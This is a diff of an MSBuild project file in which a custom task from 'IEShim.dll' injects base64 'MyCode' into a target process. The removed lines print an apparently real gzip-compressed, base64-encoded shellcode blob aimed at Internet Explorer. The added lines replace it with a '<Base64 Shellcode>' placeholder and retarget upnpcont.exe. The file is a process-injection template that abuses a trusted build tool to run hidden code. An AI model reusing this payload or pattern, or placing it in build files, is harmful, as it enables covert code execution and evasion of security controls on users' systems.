@@ -1,8 +1,8 @@
 <Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
             <Target Name="MyTarget">
                 <SimpleTask
-                MyCode='H4sIAARGRlwAA/vzoomBgSGh86nhgZTuAIPuIJ7uIJHuIg3+7V5qhv/X2CTWMOkoHDzPy3j80aeg8O4ggW4vm24fwYrHHowXA7sjFRgvd3tKPLby7DbpZrwG1ABWavGg9Btz7Q/rWpXSJxHdESqMl9O6eby7I2SAqlm6GS90uqioREcnRkYF/n8QHx/VLfS6NzaLsbd1E9ApARmG3fnt/6/u/rB1UVjGsql75/6/asNWw9Xw+0Ep62534aL8LIbg/1eTE3OS9VIrUhkAOmTGnsEAAAA='
-		        MyProcess='C:\Program Files\Internet Explorer\iexplore.exe'/>
+                MyCode='<Base64 Shellcode>'
+		        MyProcess='C:\windows\system32\upnpcont.exe'/>
             </Target>
         <UsingTask TaskName="SimpleTask" AssemblyFile='IEShim.dll' />
 </Project>
